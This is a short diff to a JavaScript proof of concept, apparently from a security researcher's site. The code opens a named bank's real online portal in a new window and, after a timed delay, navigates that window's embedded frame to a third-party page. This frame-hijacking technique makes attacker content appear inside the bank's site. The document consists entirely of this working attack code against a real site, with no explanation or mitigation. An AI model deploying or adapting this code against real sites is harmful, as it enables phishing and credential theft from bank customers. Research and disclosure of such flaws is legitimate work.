@@ -10,13 +10,14 @@ var w2;
 
 function dostuff() {
     //w = window.open('https://www.bancomer.com/', 'target');
-    w = window.open('https://portal.bancomer.com/', 'target');
+    w = window.open('https://portal.bancomer.com/personas/renovacion.jsp', 'target');
     setTimeout(dostuff2, 7500);
 }
 
 function dostuff2() {
 
     w.frames[0].location.href = 'https://olemoudi.github.com/pocs/iframes/busted.html';
+    //w.frames[0].location.href = 'https://www.bancomer.com';
 
 }
 
